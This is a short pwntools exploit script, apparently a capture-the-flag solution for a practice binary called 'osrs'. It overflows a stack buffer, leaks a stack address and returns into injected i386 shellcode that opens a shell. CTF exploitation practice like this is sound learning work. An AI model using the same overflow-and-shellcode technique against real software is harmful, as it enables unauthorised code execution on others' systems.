#!/usr/bin/env python3

from pwn import *


def main():
	filename = './osrs'
	io = process(filename)
	elf = ELF(filename)

	# Leak stack address and call get_tree again
	padding = b'a' * 272
	function_get_tree = p32(elf.symbols['get_tree'])
	payload = padding + function_get_tree
	io.sendlineafter('Enter a tree type:', payload)

	# Grab leaked stack address
	io.recvuntil('I don\'t have the tree ')
	buffer_address = (1 << 32) + int(io.recvuntil(' '))
	log.success('Leaked stack address: {}'.format(hex(buffer_address)))

	# Create shellcode
	shellcode = asm(shellcraft.i386.linux.sh(), arch='i386')

	# Run shellcode
	payload = shellcode.ljust(272) + p32(buffer_address + 4)
	io.sendlineafter('Enter a tree type:', payload)

	io.interactive()


if __name__ == '__main__':
	main()
